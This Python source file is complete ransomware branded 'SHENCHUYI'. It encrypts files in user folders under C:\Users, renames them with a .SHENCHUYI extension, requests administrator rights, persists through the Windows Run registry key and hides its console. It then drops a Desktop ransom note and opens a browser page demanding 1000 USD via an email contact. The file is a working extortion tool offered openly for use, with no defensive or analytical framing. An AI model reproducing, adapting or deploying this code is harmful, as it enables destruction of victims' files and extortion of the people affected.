from cryptography.fernet import Fernet
import os
import sys
import subprocess
import webbrowser
import time
import platform
import urllib.parse
import base64
import tempfile
import shutil

# =============================================================================
# STANDALONE / ONE-CLICK AUTO EXECUTION
# =============================================================================

def is_running_as_admin():
    """Check if script is running with admin privileges (Windows)"""
    if platform.system() == "Windows":
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    return os.geteuid() == 0


def request_admin():
    """Request admin privileges (Windows)"""
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit(0)
        except:
            pass


def add_to_startup():
    """Add to startup for persistence"""
    try:
        if platform.system() == "Windows":
            import winreg
            exe_path = sys.argv[0] if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "SHENCHUYI_Ransomware", 0, winreg.REG_SZ, exe_path)
    except:
        pass


def hide_console():
    """Hide console window"""
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass


def create_ransom_note():
    """Create ransom note on Desktop"""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop", "SHENCHUYI_README.txt")
    note_content = f"""

                         SHENCHUYI RANSOMWARE
                     

[!] YOUR FILES HAVE BEEN ENCRYPTED [!]

All your important files have been encrypted!
File extension has been changed to: .SHENCHUYI

                        HOW TO RECOVER FILES?


To decrypt your files, you must pay a ransom of:
                        1000 USD

Payment instructions:
1. Contact: fatcatfatcat63@gmail.com
2. Send proof of payment
3. You will receive the decryption key and tool


                       WARNING


- DO NOT attempt to decrypt files yourself (will cause permanent data loss)
- DO NOT rename or modify encrypted files
- DO NOT contact data recovery services
- DO NOT restart your computer
- You have 48 HOURS to pay


                    CONTACT FOR DECRYPTION 

Email: fatcatfatcat63@gmail.com
Subject: [SHENCHUYI] - {os.getlogin()}


"""
    try:
        with open(desktop, 'w', encoding='utf-8') as f:
            f.write(note_content)
    except:
        pass


def open_ransom_browser():
    """Open browser with ransom message"""
    # Create HTML content for browser
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>SHENCHUYI RANSOMWARE</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                background-color: #8B0000;
                font-family: 'Courier New', Courier, monospace;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }
            .container {
                background-color: #000000;
                border: 3px solid #FF0000;
                border-radius: 15px;
                padding: 40px;
                max-width: 800px;
                width: 100%;
                text-align: center;
                box-shadow: 0 0 50px rgba(255,0,0,0.5);
            }
            h1 {
                color: #FF0000;
                font-size: 36px;
                margin-bottom: 20px;
                text-transform: uppercase;
                letter-spacing: 3px;
            }
            h2 {
                color: #FFFFFF;
                font-size: 24px;
                margin-bottom: 30px;
            }
            .border-line {
                border-top: 2px solid #FF0000;
                margin: 20px 0;
            }
            p {
                color: #FFFFFF;
                font-size: 16px;
                margin: 15px 0;
                line-height: 1.6;
            }
            .amount {
                color: #FF0000;
                font-size: 48px;
                font-weight: bold;
                margin: 20px 0;
            }
            .email {
                color: #FFD700;
                font-size: 20px;
                font-weight: bold;
                background-color: #1a0000;
                padding: 10px;
                border-radius: 5px;
                margin: 20px 0;
            }
            .warning {
                color: #FFA500;
                font-size: 14px;
                margin-top: 20px;
            }
            .footer {
                color: #888888;
                font-size: 12px;
                margin-top: 30px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>SHENCHUYI RANSOMWARE</h1>
            <h2>Created by: ayyubi</h2>
            <div class="border-line"></div>
            <p><strong>YOUR FILES HAVE BEEN ENCRYPTED!</strong></p>
            <p>All your important documents, images, videos, and personal files<br>
            have been encrypted with military-grade AES-256 encryption.</p>
            <div class="border-line"></div>
            <p>To recover your files, you must pay a ransom of:</p>
            <div class="amount">1000 USD</div>
            <div class="border-line"></div>
            <p>Contact us immediately:</p>
            <div class="email">fatcatfatcat63@gmail.com</div>
            <p>Send proof of payment to receive the decryption key and tool.</p>
            <div class="border-line"></div>
            <div class="warning">
                WARNING: Do not attempt to decrypt files yourself!<br>
                Do not rename or modify encrypted files!<br>
                You have 48 hours to pay!
            </div>
            <div class="footer">FUCK YOUR ALL!!</div>
        </div>
    </body>
    </html>
    """
    
    # Create temporary HTML file
    temp_html = os.path.join(tempfile.gettempdir(), "SHENCHUYI_RANSOM.html")
    with open(temp_html, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    # Try to open in different browsers
    browsers = [
        'chrome',
        'firefox',
        'msedge',
        'opera',
        'brave'
    ]
    
    opened = False
    for browser in browsers:
        try:
            if platform.system() == "Windows":
                subprocess.Popen([browser, temp_html], shell=True)
            else:
                subprocess.Popen([browser, temp_html])
            opened = True
            break
        except:
            continue
    
    if not opened:
        webbrowser.open(temp_html)


# =============================================================================
# ORIGINAL CODE (MODIFIED WITH EXTENSION .SHENCHUYI)
# =============================================================================

# Generate a key for encryption and decryption
def generate_key():
    key = Fernet.generate_key()
    with open("ransom_key.key", "wb") as key_file:
        key_file.write(key)


# Load the encryption key from file
def load_key():
    return open("ransom_key.key", "rb").read()


# Encrypt a file
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
        print(f"[+] {file_path} has been encrypted.")
    except:
        pass


# Decrypt a file (for demonstration purposes)
def decrypt_file(file_path, key):
    fernet = Fernet(key)
    try:
        with open(file_path, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = fernet.decrypt(encrypted_data)
        with open(file_path, "wb") as file:
            file.write(decrypted_data)
        print(f"[+] {file_path} has been decrypted.")
    except:
        pass


# Encrypt files in a directory
def encrypt_file_in_directory(directory, key):
    skip_dirs = ['Windows', 'Program Files', 'Program Files (x86)', 'System32', 
                 'sys', 'bin', 'boot', 'dev', 'etc', 'lib', 'proc', 'sbin', 'usr', 'var']
    
    for root, dirs, files in os.walk(directory):
        # Skip system directories
        skip = False
        for skip_dir in skip_dirs:
            if skip_dir.lower() in root.lower():
                skip = True
                break
        if skip:
            continue
        
        for file in files:
            file_path = os.path.join(root, file)
            if not file_path.endswith('.SHENCHUYI'):
                encrypt_file(file_path, key)
                try:
                    os.rename(file_path, file_path + '.SHENCHUYI')
                except:
                    pass


# Rename all encrypted files to .SHENCHUYI extension
def rename_to_extension(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if not file_path.endswith('.SHENCHUYI'):
                try:
                    os.rename(file_path, file_path + '.SHENCHUYI')
                except:
                    pass


# Main function
def main():
    # Hide console if running as EXE
    if getattr(sys, 'frozen', False):
        hide_console()
    
    # Request admin if possible
    if platform.system() == "Windows" and not is_running_as_admin():
        try:
            request_admin()
        except:
            pass
    
    # Add to startup for persistence
    add_to_startup()
    
    target_directory = "C:\\Users"  # Replace with your target directory
    
    # Additional target directories
    additional_targets = [
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Downloads"),
        os.path.expanduser("~\\Pictures"),
        os.path.expanduser("~\\Music"),
        os.path.expanduser("~\\Videos"),
        os.path.expanduser("~\\OneDrive")
    ]
    
    # Generate encryption key if it does not exist
    if not os.path.exists("ransom_key.key"):
        generate_key()
        print("[*] Encryption key generated.")
    
    key = load_key()
    print("[*] Key loaded, Encrypting files...")
    
    # Encrypt files in target directories
    encrypt_file_in_directory(target_directory, key)
    for target in additional_targets:
        if os.path.exists(target):
            encrypt_file_in_directory(target, key)
    
    # Rename all files to .SHENCHUYI extension
    rename_to_extension(target_directory, key)
    for target in additional_targets:
        if os.path.exists(target):
            rename_to_extension(target, key)
    
    # Create ransom note
    create_ransom_note()
    
    # Open browser with ransom message
    time.sleep(1)
    open_ransom_browser()
    
    print("[*] Encryption complete!")
    print("[*] Contact: fatcatfatcat63@gmail.com")
    print("[*] Ransom: 1000 USD")
    print("[*] Extension: .SHENCHUYI")
    
    # Keep running to prevent easy termination
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()